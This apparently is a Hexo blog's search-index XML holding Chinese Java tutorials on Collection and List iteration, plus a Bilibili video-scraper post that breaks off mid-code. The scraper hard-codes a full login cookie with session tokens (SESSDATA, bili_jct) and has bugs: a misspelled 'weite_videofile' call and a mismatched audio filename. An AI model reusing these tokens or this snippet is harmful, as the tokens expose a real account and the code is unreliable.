&#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">//2.增强for</span></span><br><span class="line">       <span class="comment">//下面的变量s，其实就是一个第三方的变量而已。</span></span><br><span class="line">       <span class="comment">//在循环的过程中，依次表示集合中的每一个元素</span></span><br><span class="line">      <span class="comment">/* for (String s : list) &#123;</span></span><br><span class="line"><span class="comment">           System.out.println(s);</span></span><br><span class="line"><span class="comment">       &#125;*/</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//3.Lambda表达式</span></span><br><span class="line">       <span class="comment">//forEach方法的底层其实就是一个循环遍历，依次得到集合中的每一个元素</span></span><br><span class="line">       <span class="comment">//并把每一个元素传递给下面的accept方法</span></span><br><span class="line">       <span class="comment">//accept方法的形参s，依次表示集合中的每一个元素</span></span><br><span class="line">       <span class="comment">//list.forEach(s-&gt;System.out.println(s) );</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">//4.普通for循环</span></span><br><span class="line">       <span class="comment">//size方法跟get方法还有循环结合的方式，利用索引获取到集合中的每一个元素</span></span><br><span class="line">       <span class="comment">/*for (int i = 0; i &lt; list.size(); i++) &#123;</span></span><br><span class="line"><span class="comment">           //i:依次表示集合中的每一个索引</span></span><br><span class="line"><span class="comment">           String s = list.get(i);</span></span><br><span class="line"><span class="comment">           System.out.println(s);</span></span><br><span class="line"><span class="comment">       &#125;*/</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// 5.列表迭代器</span></span><br><span class="line">       <span class="comment">//获取一个列表迭代器的对象，里面的指针默认也是指向0索引的</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//额外添加了一个方法：在遍历的过程中，可以添加元素</span></span><br><span class="line">       ListIterator&lt;String&gt; it = list.listIterator();</span><br><span class="line">       <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> it.next();</span><br><span class="line">           <span class="keyword">if</span>(<span class="string">&quot;bbb&quot;</span>.equals(str))&#123;</span><br><span class="line">               <span class="comment">//qqq</span></span><br><span class="line">               it.add(<span class="string">&quot;qqq&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       System.out.println(list);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>五种遍历方式对比</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917160757485.png" alt="image-20220917160757485"></p><div>  点击下载博客:  <div style="display: flex;justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/List%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8A%E9%81%8D%E5%8E%86.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Collection常用方法及遍历方式</title>
      <link href="/2022/09/17/Collection%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8A%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/09/17/Collection%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8A%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="集合体系结构"><a href="#集合体系结构" class="headerlink" title="集合体系结构"></a>集合体系结构</h3><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917142018634.png" alt="image-20220917142018634"></p><p>list集合特点:添加到元素是<strong>有序、可靠、有索引</strong></p><p>Set集合特点:添加的元素是<strong>无序、不重复、无索引</strong></p><hr><p>Collection 是单列集合的祖宗接口,他的功能是全部单列集合都可以继承使用的</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917142308047.png" alt="image-20220917142308047"></p><p>常用方法示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        public boolean add(E e)             添加</span></span><br><span class="line"><span class="comment">        public void clear()                 清空</span></span><br><span class="line"><span class="comment">        public boolean remove(E e)          删除</span></span><br><span class="line"><span class="comment">        public boolean contains(Object obj) 判断是否包含</span></span><br><span class="line"><span class="comment">        public boolean isEmpty()            判断是否为空</span></span><br><span class="line"><span class="comment">        public int size()                   集合长度</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       注意点：</span></span><br><span class="line"><span class="comment">        Collection是一个接口,我们不能直接创建他的对象。</span></span><br><span class="line"><span class="comment">        所以，现在我们学习他的方法时，只能创建他实现类的对象。</span></span><br><span class="line"><span class="comment">        实现类：ArrayList</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="comment">//目的：为了学习Collection接口里面的方法</span></span><br><span class="line">        <span class="comment">//自己在做一些练习的时候，还是按照之前的方式去创建对象。</span></span><br><span class="line">        Collection&lt;String&gt; coll = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.添加元素</span></span><br><span class="line">        <span class="comment">//细节1：如果我们要往List系列集合中添加数据，那么方法永远返回true，因为List系列的是允许元素重复的。</span></span><br><span class="line">        <span class="comment">//细节2：如果我们要往Set系列集合中添加数据，如果当前要添加元素不存在，方法返回true，表示添加成功。</span></span><br><span class="line">        <span class="comment">//                                       如果当前要添加的元素已经存在，方法返回false，表示添加失败。</span></span><br><span class="line">        <span class="comment">//                                       因为Set系列的集合不允许重复。</span></span><br><span class="line">        coll.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        coll.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        coll.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">        System.out.println(coll);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.清空</span></span><br><span class="line">        <span class="comment">//coll.clear();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.删除</span></span><br><span class="line">        <span class="comment">//细节1：因为Collection里面定义的是共性的方法，所以此时不能通过索引进行删除。只能通过元素的对象进行删除。</span></span><br><span class="line">        <span class="comment">//细节2：方法会有一个布尔类型的返回值，删除成功返回true，删除失败返回false</span></span><br><span class="line">        <span class="comment">//如果要删除的元素不存在，就会删除失败。</span></span><br><span class="line">        System.out.println(coll.remove(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">        System.out.println(coll);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.判断元素是否包含</span></span><br><span class="line">        <span class="comment">//细节：底层是依赖equals方法进行判断是否存在的。</span></span><br><span class="line">        <span class="comment">//所以，如果集合中存储的是自定义对象，也想通过contains方法来判断是否包含，那么在javabean类中，一定要重写equals方法。</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result1</span> <span class="operator">=</span> coll.contains(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        System.out.println(result1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.判断集合是否为空</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result2</span> <span class="operator">=</span> coll.isEmpty();</span><br><span class="line">        System.out.println(result2);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//6.获取集合的长度</span></span><br><span class="line">        coll.add(<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> coll.size();</span><br><span class="line">        System.out.println(size);<span class="comment">//3</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="面试题-为什么重写-equals-还要重写-hashcode？"><a href="#面试题-为什么重写-equals-还要重写-hashcode？" class="headerlink" title="面试题:为什么重写 equals 还要重写 hashcode？"></a>面试题:为什么重写 equals 还要重写 hashcode？</h2><p>对于任何一个对象，不论是使用继承自Object的equals方法还是重写equals方法。hashCode方法实际上必须要完成的一件事情就是，为该equals方法认定为相同的对象返回相同的哈希值。如果只重写equals方法没有重写hashCode方法，就会导致<code>equals</code>认定相同的对象却拥有不同的哈希值。就违背了hashCode方法中<strong>“相同对象必须有相同哈希值”的约定。</strong></p><h2 id="Colletion遍历方式"><a href="#Colletion遍历方式" class="headerlink" title="Colletion遍历方式"></a>Colletion遍历方式</h2><h3 id="迭代器遍历"><a href="#迭代器遍历" class="headerlink" title="迭代器遍历"></a>迭代器遍历</h3><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917145141647.png" alt="image-20220917145141647"></p><p>代码示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">           Collection系列集合三种通用的遍历方式：</span></span><br><span class="line"><span class="comment">               1.迭代器遍历</span></span><br><span class="line"><span class="comment">               2.增强for遍历</span></span><br><span class="line"><span class="comment">               3.lambda表达式遍历</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            迭代器遍历相关的三个方法：</span></span><br><span class="line"><span class="comment">                   Iterator&lt;E&gt; iterator()  ：获取一个迭代器对象</span></span><br><span class="line"><span class="comment">                   boolean hasNext()       ：判断当前指向的位置是否有元素</span></span><br><span class="line"><span class="comment">                   E next()                ：获取当前指向的元素并移动指针</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//1.创建集合并添加元素</span></span><br><span class="line">       Collection&lt;String&gt; coll = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       coll.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//2.获取迭代器对象</span></span><br><span class="line">       <span class="comment">//迭代器就好比是一个箭头，默认指向集合的0索引处</span></span><br><span class="line">       Iterator&lt;String&gt; it = coll.iterator();</span><br><span class="line">       <span class="comment">//3.利用循环不断的去获取集合中的每一个元素</span></span><br><span class="line">       <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">           <span class="comment">//4.next方法的两件事情：获取元素并移动指针</span></span><br><span class="line">           <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> it.next();</span><br><span class="line">           System.out.println(str);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>迭代器的细节注意点：</p><ol><li>报错NoSuchElementException</li><li>迭代器遍历完毕，指针不会复位</li><li>循环中只能用一次next方法</li><li>迭代器遍历时，不能用集合的方法进行增加或者删除</li></ol><h3 id="增强for遍历"><a href="#增强for遍历" class="headerlink" title="增强for遍历"></a>增强for遍历</h3><ul><li>增强for的底层就是迭代器，为了简化迭代器的代码书写的。</li><li>它是JDK5之后出现的，其内部原理就是一个lterator迭代器</li><li>所有的单列集合和数组才能用增强for进行遍历。</li></ul><p>代码示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">/* Collection系列集合三种通用的遍历方式：</span></span><br><span class="line"><span class="comment">       1.迭代器遍历</span></span><br><span class="line"><span class="comment">       2.增强for遍历</span></span><br><span class="line"><span class="comment">       3.lambda表达式遍历</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       增强for格式：</span></span><br><span class="line"><span class="comment">           for(数据类型 变量名: 集合/数组)&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       快速生成方式：</span></span><br><span class="line"><span class="comment">           集合的名字 + for 回车</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//1.创建集合并添加元素</span></span><br><span class="line">       Collection&lt;String&gt; coll = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       coll.add(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;wangwu&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//2.利用增强for进行遍历</span></span><br><span class="line">       <span class="comment">//注意点：</span></span><br><span class="line">       <span class="comment">//s其实就是一个第三方变量，在循环的过程中依次表示集合中的每一个数据</span></span><br><span class="line">       <span class="keyword">for</span>(String s : coll)&#123;</span><br><span class="line">           s = <span class="string">&quot;qqq&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       System.out.println(coll);<span class="comment">//zhangsan lisi wangwu</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>增强for的细节</p><blockquote><p>修改增强for中的变量,不会改变集合中原本的值</p></blockquote><h3 id="lambda表达式遍历"><a href="#lambda表达式遍历" class="headerlink" title="lambda表达式遍历"></a>lambda表达式遍历</h3><p>得益于JDK 8开始的新技术Lambda表达式，提供了一种更简单、更直接的遍历集合的方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">/* Collection系列集合三种通用的遍历方式：</span></span><br><span class="line"><span class="comment">       1.迭代器遍历</span></span><br><span class="line"><span class="comment">       2.增强for遍历</span></span><br><span class="line"><span class="comment">       3.lambda表达式遍历</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       lambda表达式遍历：</span></span><br><span class="line"><span class="comment">               default void forEach(Consumer&lt;? super T&gt; action):</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//1.创建集合并添加元素</span></span><br><span class="line">       Collection&lt;String&gt; coll = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       coll.add(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">       coll.add(<span class="string">&quot;wangwu&quot;</span>);</span><br><span class="line">       <span class="comment">//2.利用匿名内部类的形式</span></span><br><span class="line">       <span class="comment">//底层原理：</span></span><br><span class="line">       <span class="comment">//其实也会自己遍历集合，依次得到每一个元素</span></span><br><span class="line">       <span class="comment">//把得到的每一个元素，传递给下面的accept方法</span></span><br><span class="line">       <span class="comment">//s依次表示集合中的每一个数据</span></span><br><span class="line">      <span class="comment">/* coll.forEach(new Consumer&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">           @Override</span></span><br><span class="line"><span class="comment">           public void accept(String s) &#123;</span></span><br><span class="line"><span class="comment">               System.out.println(s);</span></span><br><span class="line"><span class="comment">           &#125;</span></span><br><span class="line"><span class="comment">       &#125;);*/</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//lambda表达式</span></span><br><span class="line">       coll.forEach(s -&gt; System.out.println(s));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917152912460.png" alt="image-20220917152912460"></p><div>  点击下载博客:  <div style="display: flex;justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/Collection.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>B站视频重构并加强--B站爬虫2.0版本</title>
      <link href="/2022/08/31/B%E7%AB%99%E8%A7%86%E9%A2%91%E9%87%8D%E6%9E%84%E5%B9%B6%E5%8A%A0%E5%BC%BA-B%E7%AB%99%E7%88%AC%E8%99%AB2-0%E7%89%88%E6%9C%AC/"/>
      <url>/2022/08/31/B%E7%AB%99%E8%A7%86%E9%A2%91%E9%87%8D%E6%9E%84%E5%B9%B6%E5%8A%A0%E5%BC%BA-B%E7%AB%99%E7%88%AC%E8%99%AB2-0%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p><a href="https://kaliluying.github.io/2021/11/12/%E5%AF%B9B%E7%AB%99%E8%A7%86%E9%A2%91%E7%88%AC%E5%8F%96%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%B9%B6%E7%BB%84%E5%90%88%E6%88%90%E5%AE%8C%E6%95%B4%E7%9A%84%E8%A7%86%E9%A2%91/">重构前的版本</a></p><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> moviepy.editor <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url_30280, url_30077, headers</span>):</span><br><span class="line">    response1 = requests.get(url_30280, headers=headers).content</span><br><span class="line">    response2 = requests.get(url_30077, headers=headers).content</span><br><span class="line">    <span class="comment"># print(response1,response2)</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;B站视频1.mp4&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(response1)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;B站视频2.mp4&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(response2)</span><br><span class="line">    <span class="comment"># 导入纯视频文件</span></span><br><span class="line">    video = VideoFileClip(<span class="string">&#x27;B站视频2.mp4&#x27;</span>)</span><br><span class="line">    <span class="comment"># 导入纯音乐文件</span></span><br><span class="line">    audio = AudioFileClip(<span class="string">&#x27;B站视频1.mp3&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将视频文件中加入音乐文件</span></span><br><span class="line">    movie = video.set_audio(audio)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    movie.weite_videofile(<span class="string">&#x27;B站视频.mp4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url_30280 = <span class="string">&#x27;https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895_nb2-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=f9b8eb9e4545f2d0d244804b9e65e780&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=40218&amp;logo=A0000100&#x27;</span></span><br><span class="line">    url_30077 = <span class="string">&#x27;https://xy221x131x191x56xy.mcdn.bilivideo.cn:4483/upgcxcode/95/78/439527895/439527895-1-30077.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=&amp;uipk=5&amp;nbs=1&amp;deadline=1636727944&amp;gen=playurlv2&amp;os=mcdn&amp;oi=3748183839&amp;trid=00015abe094f6dc94938917e8895505bead4u&amp;platform=pc&amp;upsig=df692a5e07e5ceb77c354bf38dea609f&amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform&amp;mcdnid=9001331&amp;mid=671157361&amp;bvc=vod&amp;nettype=0&amp;orderid=0,3&amp;agrr=0&amp;bw=181576&amp;logo=A0000100&#x27;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://www.bilibili.com/video/BV1c341187m9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    get_page(url_30280, url_30077, header)</span><br></pre></td></tr></table></figure><p>之前是手动抓包的形式,如果说要爬取多个视频的话会很麻烦,这次就加强一下爬虫</p><p>首先把爬虫的基本框架搭起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Video:</span><br><span class="line">    def __init__(self, url):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            &quot;cookie&quot;: &quot;CURRENT_FNVAL=4048; PVID=5; b_timer=%7B%22ffp%22%3A%7B%22333.1007.fp.risk_5BA763BD%22%3A%221825E14DE6D%22%2C%22666.7.fp.risk_5BA763BD%22%3A%221825E14EFFC%22%2C%22666.25.fp.risk_5BA763BD%22%3A%221825E17A189%22%2C%22666.4.fp.risk_5BA763BD%22%3A%221825E17D7C8%22%2C%22333.934.fp.risk_5BA763BD%22%3A%221825E197416%22%2C%22333.979.fp.risk_5BA763BD%22%3A%221825E1A122C%22%2C%22777.5.0.0.fp.risk_5BA763BD%22%3A%221825E1B15F3%22%7D%7D; fingerprint3=09a322960f9b29d88c1731cadd0dc98f; innersign=0; CURRENT_BLACKGAP=0; bp_video_offset_671157361=689759880761835600; b_lsid=D1039D10A10_1825E14DB91; i-wanna-go-back=-1; CURRENT_QUALITY=80; rpdid=0zbfVFUBEL|Ucq23nZm|3rq|3w1OiL9g; hit-dyn-v2=1; blackside_state=0; b_ut=5; buvid_fp=5905c67921a38e156c824e2d22d1b61f; LIVE_BUVID=AUTO6416594074645196; DedeUserID=671157361; DedeUserID__ckMd5=ba8273578e2f6b80; SESSDATA=a6489929%2C1674959436%2Ca4b2a*81; bili_jct=fe131d3907b8eea7c59b3abfaa60a6e2; sid=5qy9dddr; buvid_fp_plain=undefined; fingerprint=5905c67921a38e156c824e2d22d1b61f; _uuid=8E3D575D-4517-7613-7B25-C4B27FDAF510306266infoc; buvid4=49E57E44-822A-F96C-B9B5-C3CB36DEC69E07142-022080210-2vQi149BRC5hxFHhxBtSxnTgzdnGNZWCAywIAqBXeJ4aJAXCFMFEag%3D%3D; buvid3=5BA763BD-A667-A548-A705-1705D82E763306244infoc&quot;,</span><br><span class="line">            &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    # 获取页面源码</span><br><span class="line">    def get_page(self):</span><br><span class="line">        response = requests.get(self.url, headers=self.headers)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            return response.text</span><br><span class="line">        return None</span><br><span class="line">    def run(self):</span><br><span class="line">        html = self.get_page()</span><br></pre></td></tr></table></figure><p>还是之前的<a href="https://www.bilibili.com/video/BV1c341187m9">网站</a>,首先先抓一下包</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220829212938041.png"></p><p>这是视频和音频,之前已经讲过了,在元素中查找发现位置,再再源码中查一下</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220831205427024.png" alt="image-20220831205427024"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220831205600346.png" alt="image-20220831205600346"></p><p>名字有些出入,源码为主</p><p>既然找到了位置就可以匹配,用xparh中的contains语法获取到script中的内容,在用正则匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 